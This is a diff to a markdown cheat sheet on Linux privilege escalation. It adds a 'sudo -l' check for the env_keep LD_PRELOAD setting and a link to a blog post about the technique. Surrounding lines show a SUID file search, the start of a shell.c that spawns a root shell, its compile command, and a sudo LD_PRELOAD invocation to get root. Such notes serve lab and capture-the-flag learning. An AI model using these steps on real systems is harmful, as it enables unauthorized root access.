@@ -47,6 +47,11 @@ find / -type f -perm -04000 -ls 2>/dev/null
 ---
 
 ## Using LD_Preload
+  - You can check if LD_Preload environment option is there or not by 
+ ```
+ sudo -l
+ ```
+  - If you can see this 👉`env_keep+=LD_Preload` then the function is enabled.
   - This piece of code will spawn root shell ➡️ [shell.c](https://github.com/Somchandra17/Privilege-Escalation/blob/01f889492ff51414fa077a01fa538ecd5a0d4543/shell.c)
 ```
 #include <stdio.h>
@@ -68,6 +73,7 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfile
 ```
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
+> This is also explained in this blog - https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 
 ---
 
